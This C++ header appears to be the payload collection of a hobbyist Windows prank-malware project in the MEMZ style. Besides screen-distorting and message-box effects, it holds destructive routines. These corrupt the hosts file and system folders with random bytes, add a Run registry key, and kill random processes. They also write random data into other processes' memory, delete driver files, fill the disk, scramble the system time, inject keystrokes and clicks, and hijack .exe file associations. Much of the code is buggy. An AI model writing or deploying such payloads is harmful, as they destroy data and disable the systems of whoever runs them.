#pragma once
#define fori(x) for (INT i = 0; i < x; i++)
#define whiletrue while (true)

HDC hDesk = GetDC(NULL);

int rickroll() {
	ShellExecuteA(NULL, "open", "https://www.youtube.com/watch?v=dQw4w9WgXcQ", NULL, NULL, SW_HIDE);

	// youtube.com/dQw4w9WgXcQ
	return 0;
}

int p1()
{ //msgbox
	MSGBOXPARAMS msg2 = {0};
	msg2.cbSize = sizeof(MSGBOXPARAMS);
	msg2.hwndOwner = NULL;
	msg2.hInstance = GetModuleHandle(NULL);
	msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
	msg2.lpszCaption = "Your computer is mine now";
	msg2.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

	MSGBOXPARAMS msg1 = {0};
	msg1.cbSize = sizeof(MSGBOXPARAMS);
	msg1.hwndOwner = NULL;
	msg1.hInstance = GetModuleHandle(NULL);
	msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
	msg1.lpszCaption = "Error";
	msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
	HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

	CloseHandle(hmsg2);
	CloseHandle(hmsg3);
	return 0;
}

int p2()
{ //memz final payload but random
	HANDLE hmsg;
	HDC desk;
	fori(50)
	{

		//msgbox spam
		DWORD dwID = 0;
		MSGBOXPARAMS msg = {0};
		msg.cbSize = sizeof(MSGBOXPARAMS);
		msg.hwndOwner = NULL;
		msg.hInstance = GetModuleHandle(NULL);
		msg.lpszText = "bet you regret that now huh";
		msg.lpszCaption = "ez";
		msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
		hmsg = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);

		HWND desktop = GetDesktopWindow();
		desk = GetDC(NULL);
		RECT rect;
		GetWindowRect(desktop, &rect);
		int w = rect.right - rect.left;
		int h = rect.bottom - rect.top;
		StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
		Sleep(300 - (4 * i));
		TextOutA(desk, 100, 100, "Hey look its ur screen down below", 33);
		StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

		HRGN hRegion1;
		hRegion1 = CreateRectRgn(0, 0, w, h);
		InvertRgn(desk, hRegion1);

		Beep(rand() % 30000, rand() % 1000);
	}
	CloseHandle(hmsg);
	ReleaseDC(NULL, desk);
	return 0;
}

int p3()
{
	HWND desktop = GetDesktopWindow();
	RECT rect;
	GetWindowRect(desktop, &rect);
	INT w = rect.right - rect.left;
	INT h = rect.bottom - rect.top;
	HDC desk = GetDC(NULL);
	PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

	INT sw = GetSystemMetrics(SM_CXSCREEN);
	INT sh = GetSystemMetrics(SM_CYSCREEN);
	SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

	for (INT index = 0; index < 100; index++)
	{
		BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
		BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
	}

	ReleaseDC(NULL, desk);

	return 0;
}

//Corrupt the registry
int p4()
{
	//Create an asynchronous messagebox
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
	RegSetValueEx(hKey, "Xytharis", 0, REG_SZ, (BYTE *)"C:\\Windows\\System32\\cmd.exe", strlen("C:\\Windows\\System32\\cmd.exe"));
	RegCloseKey(hKey);
	CloseHandle(hmsg);
	return 0;
}

//Corrupt the file system
int p5()
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);

	fori(100)
	{
		HANDLE hFile = CreateFileA("C:\\Windows\\System32\\drivers\\etc\\hosts", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			break;
		}
		DWORD dwSize = GetFileSize(hFile, NULL);
		if (dwSize == INVALID_FILE_SIZE)
		{
			break;
		}
		LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		DWORD dwBytesRead = 0;
		if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer2 == NULL)
		{
			break;
		}
		memcpy(lpBuffer2, lpBuffer, dwSize);
		fori(dwSize)
		{
			if (i % 2 == 0)
			{
				((LPBYTE)lpBuffer2)[i] = rand() % 255;
			}
		}
		if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
		VirtualFree(lpBuffer2, 0, MEM_RELEASE);
		CloseHandle(hFile);
	}
	CloseHandle(hmsg);
	return 0;
}

//Corrupt current memory
int p6()
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);

	fori(100)
	{
		LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		fori(0x1000)
		{
			((LPBYTE)lpBuffer)[i] = rand() % 255;
		}
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
	}
	CloseHandle(hmsg);
	return 0;
}

//Delete all files on Desktop
int p7()
{
	fori(100)
	{
		HANDLE hFile = CreateFileA("C:\\Users\\Public\\Desktop\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			break;
		}
		DWORD dwSize = GetFileSize(hFile, NULL);
		if (dwSize == INVALID_FILE_SIZE)
		{
			break;
		}
		LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		DWORD dwBytesRead = 0;
		if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer2 == NULL)
		{
			break;
		}
		memcpy(lpBuffer2, lpBuffer, dwSize);
		fori(dwSize)
		{
			if (i % 2 == 0)
			{
				((LPBYTE)lpBuffer2)[i] = rand() % 255;
			}
		}
		if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
		VirtualFree(lpBuffer2, 0, MEM_RELEASE);
		CloseHandle(hFile);
	}
	return 0;
}

//Terminate random running processes
int p8()
{ 
	whiletrue
	{
		HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, rand() % 10000);
		if (hProcess == NULL)
		{
			break;
		}
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	return 0;
}

//Leak Memory
int p9()
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);
 
	fori(100)
	{
		LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
	}
	CloseHandle(hmsg);
	return 0;
}

//Hog all available memory
int p10()
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);

	fori(5000)
	{
		LPVOID lpBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
	}

	CloseHandle(hmsg);
	return 0;
}

//Fill up the entire hard drive
int p11()
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);

	std::ofstream file;
	file.open("fill");
	fori(100)
	{
		
		fori(0x100000)
		{
			file << "lllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll";
		}
		HANDLE hFile = CreateFileA("C:\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			break;
		}
		DWORD dwSize = GetFileSize(hFile, NULL);
		if (dwSize == INVALID_FILE_SIZE)
		{
			break;
		}
		LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		DWORD dwBytesRead = 0;
		if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer2 == NULL)
		{
			break;
		}
		memcpy(lpBuffer2, lpBuffer, dwSize);
		fori(dwSize)
		{
			if (i % 2 == 0)
			{
				((LPBYTE)lpBuffer2)[i] = rand() % 255;
			}
		}
		if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
		VirtualFree(lpBuffer2, 0, MEM_RELEASE);
		CloseHandle(hFile);
	}
	file.close();

	CloseHandle(hmsg);
	return 0;
}

//Open random system programs
int p12()
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "Some very funny things are happening right now!";
	msg.lpszCaption = ":)";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);

	fori(100)
	{
		HANDLE hFile = CreateFileA("C:\\Windows\\System32\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			break;
		}
		DWORD dwSize = GetFileSize(hFile, NULL);
		if (dwSize == INVALID_FILE_SIZE)
		{
			break;
		}
		LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		DWORD dwBytesRead = 0;
		if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer2 == NULL)
		{
			break;
		}
		memcpy(lpBuffer2, lpBuffer, dwSize);
		fori(dwSize)
		{
			if (i % 2 == 0)
			{
				((LPBYTE)lpBuffer2)[i] = rand() % 255;
			}
		}
		if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
		{
			break;
		}
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
		VirtualFree(lpBuffer2, 0, MEM_RELEASE);
		CloseHandle(hFile);
	}
	CloseHandle(hmsg);
	return 0;
}

// Open a website
int p13() 
{
	MSGBOXPARAMS msg = {0};
	msg.cbSize = sizeof(MSGBOXPARAMS);
	msg.hwndOwner = NULL;
	msg.hInstance = GetModuleHandle(NULL);
	msg.lpszText = "subscribe to kevlu8 or i kill ur pc";
	msg.lpszCaption = "do it";
	msg.dwStyle = MB_OK | MB_ICONHAND;
	HANDLE hmsg = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);

	fori(50)
	{
		LPCSTR urls[] = {
			"https://kevlu8.herokuapp.com",
			"https://www.reddit.com/r/eyeblech",
			"https://www.youtube.com/kevlu8",
			"https://www.github.com/kevlu8",
			"https://www.github.com/kevlu8/Xytharis",
			"https://www.torproject.org/download/",
			"https://www.discord.gg/nhzXNNS",
			"https://www.twitter.com/kevlu8wastaken",
			"https://www.instagram.com",
			"https://www.facebook.com/",
			"https://web.archive.org/web/20210620035058/reddit.com/r/nonewnormal/",
			"https://www.roblox.com",
			"https://www.youareanidiot.org",
			"https://www.twitter.com/dreamwastaken",
			"https://www.youtube.com/channel/UCsiysQAqUGTLsk04k_BVowQ"
		};
		Sleep(rand() % 10000);
		ShellExecuteA(NULL, "open", urls[rand() % 14], NULL, NULL, SW_HIDE);
	}
	CloseHandle(hmsg);
	return 0;
}

// Trap
int p14() 
{
	if (MessageBoxW(NULL, L"You know what? I'm tired. Let's end this.", L"Trade offer", MB_YESNO | MB_ICONINFORMATION) == IDYES)
	{
		MessageBoxW(NULL, L"I'm sorry, but I can't let you do that.", L"Trade offer", MB_OK | MB_ICONHAND);

		fori(70) {
			BitBlt(GetDC(NULL), 0, 0, 0, 0, GetDC(NULL), 0, 0, 0x00CC0020);
			Sleep(rand() % 100);
		}

		RtlMoveMemory(GetCommandLineA(), "", 0);

		//ShellExecuteA(NULL, NULL, "\\\\.\\GLOBALROOT\\ConDrv\\Device\\KernelConnect", NULL, NULL, SW_HIDE);
	}
	return 0;
}

// Put "Your Mom" on the screen as text
int p15() 
{
	fori(500)
	{
		Sleep(rand() % 100);
		HDC hdc = GetDC(NULL);
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		switch (i % 5) {
			case 0:
				TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "Your Mom", 9);
				break;
			case 1:
				TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ur mom", 7);
				break;
			case 2:
				TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "bjormom", 8);
				break;  
			case 3:
				TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "so bad", 6);
				break;
			default:
				TextOutA(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), "ha", 3);
				break;
		}
		ReleaseDC(NULL, hdc);
	}
	return 0;
}

// Play randomly generated audio
int p16() //TODO fix
{
	whiletrue
	{
		Sleep(rand() % 100);
		PlaySound(NULL, NULL, SND_ASYNC | SND_MEMORY);
		LPSTR lpBuffer = (LPSTR)VirtualAlloc(NULL, 0x10000, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		fori(0x10000)
		{
			lpBuffer[i] = rand() % 255;
		}
		PlaySoundA(lpBuffer, NULL, SND_ASYNC | SND_MEMORY);
		VirtualFree(lpBuffer, 0, MEM_RELEASE);
	}
	return 0;
}

// Put a random image on the screen
int p17() 
{
	fori(50)
	{
		Sleep(rand() % 100);
		HDC hdc = GetDC(NULL);
		HBITMAP hBitmap = LoadBitmapA(NULL, MAKEINTRESOURCEA(rand() % 1000));
		if (hBitmap == NULL)
		{
			break;
		}
		BITMAP bm;
		GetObject(hBitmap, sizeof(BITMAP), &bm);
		HDC hdcMem = CreateCompatibleDC(hdc);
		SelectObject(hdcMem, hBitmap);
		BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), bm.bmWidth, bm.bmHeight, hdcMem, 0, 0, SRCCOPY);
		DeleteDC(hdcMem);
		DeleteObject(hBitmap);
		ReleaseDC(NULL, hdc);
	}
	return 0;
}

// Change screen resolution
int p18() 
{
	fori(50)
	{
		Sleep(rand() % 60000);
		ChangeDisplaySettingsA(NULL, 0);
		DEVMODE dm;
		dm.dmSize = sizeof(DEVMODE);
		dm.dmPelsWidth = rand() % GetSystemMetrics(SM_CXSCREEN);
		dm.dmPelsHeight = rand() % GetSystemMetrics(SM_CYSCREEN);
		dm.dmBitsPerPel = rand() % 32;
		dm.dmFields = DM_PELSWIDTH | DM_PELSHEIGHT | DM_BITSPERPEL;
		ChangeDisplaySettingsA(&dm, CDS_FULLSCREEN);
	}
	return 0;
}

// Change the mouse cursor
int p19() 
{
	fori(50)
	{
		Sleep(rand() % 10000);
		SetCursor(LoadCursorA(NULL, MAKEINTRESOURCEA(rand() % 1000)));
	}
	return 0;
}

// Change the keyboard layout
int p20() // Do in thread
{
	whiletrue
	{
		Sleep(rand() % 100000);
		LoadKeyboardLayoutA(MAKEINTRESOURCEA(rand() % 1000), 0);
	}
	return 0;
}

// Make the keyboard type random characters
int p21() // Do in thread
{
	whiletrue
	{
		Sleep(rand() % 10000);
		fori(rand() % 100)
		{
			keybd_event(rand() % 255, rand() % 255, rand() % 2, 0);
		}
	}
	return 0;
}

// Make the mouse move and click randomly
int p22() // Must do in thread
{
	whiletrue
	{
		Sleep(rand() % 50);
		mouse_event(rand() % 3, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
		mouse_event(rand() % 3, rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN), rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));
	}
	return 0;
}

// Corrupt random programs
int p23() 
{
	fori(50)
	{
		Sleep(rand() % 5000);
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, rand() % 0xFFFF);
		if (hProcess == NULL)
		{
			break;
		}
		DWORD dwSize = 0x10000;
		LPVOID lpBuffer = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
		if (lpBuffer == NULL)
		{
			break;
		}
		fori(0x10000)
		{
			char c = rand() % 255;
			if (c == 0)
			{
				c = 1;
			}
			WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBuffer + i), &c, 1, NULL);
		}
		VirtualFreeEx(hProcess, lpBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
	}
	return 0;
}

// Randomly delete drivers
int p24() 
{
	fori(50)
	{
		Sleep(rand() % 5000);
		char szDriver[MAX_PATH];
		GetSystemDirectoryA(szDriver, MAX_PATH);
		strcat(szDriver, "\\drivers\\");
		strcat(szDriver, rand() % 2 ? "vmmouse.sys" : "vm3d.sys");
		DeleteFileA(szDriver);
	}
	return 0;
}

// Disconnect from the internet
int p25() 
{
	whiletrue {
		InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
		InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
		return 0;
	}
}

// Randomly change the system time
int p26()  //MUST DO IN THREAD
{
	whiletrue
	{
		Sleep(rand() % 5000);
		SYSTEMTIME st;
		st.wYear = rand() % 0xFFFF;
		st.wMonth = rand() % 12;
		st.wDayOfWeek = rand() % 7;
		st.wDay = rand() % 31;
		st.wHour = rand() % 24;
		st.wMinute = rand() % 60;
		st.wSecond = rand() % 60;
		st.wMilliseconds = rand() % 1000;
		SetSystemTime(&st);
	}
	return 0;
}

// Randomly change the sound volume
int p27()  //MUST DO IN THREAD
{
	whiletrue
	{
		Sleep(rand() % 10000);
		DWORD dwVolume;
		waveOutGetVolume(NULL, &dwVolume);
		dwVolume = (rand() % 0xFFFF) | (dwVolume & 0xFFFF0000);
		waveOutSetVolume(NULL, dwVolume);
	}
	return 0;
}

// Color shift the screen using BitBlt
int p28() 
{
	fori(50)
	{
		Sleep(rand() % 10000);
		HDC hdc = GetDC(NULL);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN));
		HDC hdcMem = CreateCompatibleDC(hdc);
		SelectObject(hdcMem, hBitmap);
		BitBlt(hdcMem, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdc, 0, 0, SRCCOPY);
		fori(GetSystemMetrics(SM_CXSCREEN))
		{
			for (int j = 0; j < SM_CYSCREEN; j++)
			{
				COLORREF color = GetPixel(hdcMem, i, j);
				SetPixel(hdcMem, i, j, RGB(GetRValue(color) + rand() % 0xFF, GetGValue(color) + rand() % 0xFF, GetBValue(color) + rand() % 0xFF));
			}
		}
		BitBlt(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), hdcMem, 0, 0, SRCCOPY);
		DeleteDC(hdcMem);
		DeleteObject(hBitmap);
		ReleaseDC(NULL, hdc);
	}
	return 0;
}

// Connect a virtual USB device
int p29() 
{
	Sleep(rand() % 10000);
	HANDLE hDevice = CreateFileA("\\\\.\\RandomUSBFile", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hDevice == INVALID_HANDLE_VALUE)
	{
		return -1;
	}
	CloseHandle(hDevice);
	return 0;
}

// Randomly change the system language
int p30() 
{
	SetLocaleInfoA(LOCALE_USER_DEFAULT, LOCALE_ILANGUAGE, MAKEINTRESOURCEA(rand() % 1000));
	return 0;
}

// Randomly change the system theme
int p31() 
{
	SetWindowTheme(NULL, (LPCWSTR)MAKEINTRESOURCEA(rand() % 1000), NULL);
	return 0;
}

// Associate .exe files with this program
int p32()  //TODO: Work on later
{
	Sleep(rand() % 10000);
	TCHAR buffer[MAX_PATH] = { 0 };
	GetModuleFileName( NULL, buffer, MAX_PATH );
	HKEY hKey;
	RegCreateKeyExA(HKEY_CLASSES_ROOT, ".exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);
	RegSetValueExA(hKey, NULL, 0, REG_SZ, (LPBYTE)buffer, strlen(buffer) + 1);
	RegCloseKey(hKey);
	return 0;
}

//32 payloads. I'm done for the day!

// Move screen around
int p33() 
{
	HDC compatibleDC = CreateCompatibleDC(hDesk);
	HBITMAP bmp = CreateCompatibleBitmap(compatibleDC, SM_CXSCREEN, SM_CYSCREEN);
	fori(50) {
		SelectObject(compatibleDC, bmp);
		BitBlt(hDesk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, hDesk, 0, 0, BLACKNESS);
		BitBlt(hDesk, i, sin(i), SM_CXSCREEN, SM_CYSCREEN, compatibleDC, 0, 0, SRCCOPY);
	}
	DeleteObject(bmp);
	DeleteDC(compatibleDC);
	return 0;
}

// BitBlt the screen
int p34() 
{
	fori(1920)
	{
		BitBlt(hDesk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, hDesk, i, 0, SRCCOPY);
	}
	fori(1920)
	{
		BitBlt(hDesk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, hDesk, -i, 0, SRCCOPY);
	}
	return 0;
}

// Put randomly generated effects on the user's screen
int p35() {
	Sleep(rand() % 10000);
	HDC desk = GetDC(NULL);
	while (true) {
		DWORD randNum = (rand() % 0x99999999) * 0x500;
		for (int i = 0; i < 500; i++) {
			BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, randNum);		
		}
		Sleep(1000);
	}
	return 0;
}

int p36() {
	HDC desk = GetDC(NULL);
	DWORD randEffect;
	while (true) {
		int screenX = GetSystemMetrics(SM_CXSCREEN);
		int screenY = GetSystemMetrics(SM_CYSCREEN);
		int y1 = rand() % screenY;
		int y2 = rand() % screenY;
		int y3 = rand() % screenY;
		int y4 = rand() % screenY;
		int y5 = rand() % screenY;
		int randEffectNum = rand() % 13;
		// int randEffectNum = 1;
		if (randEffectNum == 1) {
			randEffect = CAPTUREBLT;
		}
		else if (randEffectNum == 2) {
			randEffect = DSTINVERT;
		}
		else if (randEffectNum == 3) {
			randEffect = MERGECOPY;
		}
		else if (randEffectNum == 4) {
			randEffect = MERGEPAINT;
		}
		else if (randEffectNum == 5) {
			randEffect = NOTSRCCOPY;
		}
		else if (randEffectNum == 6) {
			randEffect = MERGECOPY;
		}
		else if (randEffectNum == 7) {
			randEffect = NOTSRCERASE;
		}
		else if (randEffectNum == 8) {
			randEffect = PATCOPY;
		}
		else if (randEffectNum == 9) {
			randEffect = PATINVERT;
		}
		else if (randEffectNum == 10) {
			randEffect = PATPAINT;
		}
		else if (randEffectNum == 11) {
			randEffect = SRCAND;
		}
		else if (randEffectNum == 12) {
			randEffect = SRCERASE;
		}
		else if (randEffectNum == 13) {
			randEffect = SRCINVERT;
		}
		else if (randEffectNum == 0) {
			randEffect = SRCPAINT;
		}
		else {
			//cout << "death";
		}
		BitBlt(desk, 10, 450, 50, 250, desk, 10, y1, randEffect);
		BitBlt(desk, 10, 700, 300, 50, desk, 10, y1, randEffect);
		BitBlt(desk, 260, 450, 50, 250, desk, 260, y1, randEffect);
		// writes "u"
		BitBlt(desk, 360, 500, 50, 250, desk, 360, y2, randEffect);
		BitBlt(desk, 360, 450, 300, 50, desk, 360, y2, randEffect);
		// writes "r"
		BitBlt(desk, 760, 500, 50, 250, desk, 760, y3, randEffect);
		BitBlt(desk, 760, 450, 350, 50, desk, 760, y3, randEffect);
		BitBlt(desk, 910, 500, 50, 250, desk, 910, y3, randEffect);
		BitBlt(desk, 1060, 500, 50, 250, desk, 1060, y3, randEffect);
		// writes the first "m"
		BitBlt(desk, 1160, 450, 50, 250, desk, 1160, y4, randEffect);
		BitBlt(desk, 1160, 700, 250, 50, desk, 1160, y4, randEffect);
		BitBlt(desk, 1210, 450, 250, 50, desk, 1210, y4, randEffect);
		BitBlt(desk, 1410, 500, 50, 250, desk, 1410, y4, randEffect);
		// writes "o"
		BitBlt(desk, 1510, 500, 50, 250, desk, 1510, y5, randEffect);
		BitBlt(desk, 1510, 450, 350, 50, desk, 1510, y5, randEffect);
		BitBlt(desk, 1660, 500, 50, 250, desk, 1660, y5, randEffect);
		BitBlt(desk, 1810, 500, 50, 250, desk, 1810, y5, randEffect);
		// writes the second "m"
		//cout << " randEffectNum = " << randEffectNum << " and randEffect = " << randEffect;
		//cout << "\ny1 = " << y1 << "and y2 = " << y2 << "and y2 = " << y3 << "and y2 = " << y4 << "and y2 = " << y5;
		Sleep(1000);

	}
}


int p37() {
	whiletrue
	{
		Sleep(rand() % 10000);
		HDC desk = GetDC(NULL);
		fori(500)
		{
			for (int i = 0; i < 500; i++)
			{
				BitBlt(desk, i, i, 1500, 1000, desk, 0, 0, SRCCOPY);
			}
		}
	}
	return 0;
}

int p38() {
	whiletrue
	{
		// Open a link
		ShellExecute(NULL, "open", "https://www.goggle.com", NULL, NULL, SW_SHOW);
		HDC desk = GetDC(NULL);
		BitBlt(desk, 0, 0, SM_CXSCREEN, SM_CYSCREEN, desk, 0, 0, 0x12345678);
		Sleep(rand() % 10000);
	}
}

int p39() {
	whiletrue
	{ 
		
	}
}

// goal = 64 payloads